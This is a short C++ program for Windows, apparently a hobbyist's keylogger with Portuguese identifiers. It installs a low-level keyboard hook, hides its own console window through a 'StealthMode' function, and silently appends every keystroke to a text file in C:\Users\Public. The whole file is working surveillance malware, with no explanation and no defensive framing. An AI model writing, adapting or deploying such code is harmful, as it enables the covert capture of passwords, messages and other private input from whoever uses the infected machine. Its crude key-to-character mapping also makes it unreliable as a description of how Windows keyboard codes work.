#include <stdio.h>
#include <iostream>
#include <Windows.h>
#include <string.h>
#include <fstream>

using namespace std;
HHOOK hook;

LRESULT CALLBACK funchook(int codigo, WPARAM wParam, LPARAM lParam);
void saveFile(char ch);
void StealthMode();

int main() {
    StealthMode();
    MSG msg;

    hook = SetWindowsHookExA(WH_KEYBOARD_LL, funchook, NULL, 0);
    if(hook == NULL){
        printf("deu erro");
        return(1);
    }

    while (GetMessage(&msg, NULL, 0, 0) != 0){
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hook);

    //std::cout << "Hello, World!" << std::endl;
    //std::cin.get();
    //return 0;
}

void saveFile(char ch)
{
    try {
        std::ofstream fw("C:\\Users\\Public\\CPlusPlusSampleFile.txt", ios::app);
        if (fw.is_open())
        {
            fw << ch;
            fw.close();
        }
        else std::cout << "Problem with opening file";
    }
    catch (const char* msg) {

    }
}

LRESULT CALLBACK funchook(int codigo, WPARAM wParam, LPARAM lParam){
    char ch;
    PKBDLLHOOKSTRUCT kbDllHook = (PKBDLLHOOKSTRUCT)lParam;
    if(wParam==WM_KEYDOWN && codigo == HC_ACTION) {
        if(!GetAsyncKeyState(VK_SHIFT)){
            ch = kbDllHook->vkCode + 32;
        }else{
            ch = kbDllHook->vkCode;
        }
        saveFile(ch);
        printf("%c", ch);
    }
    return(CallNextHookEx(hook, codigo, wParam, lParam));
}

void StealthMode(){
    HWND stealth;
    AllocConsole();
    stealth=FindWindowA("ConsoleWindowClass",NULL);
    ShowWindow(stealth,0);

}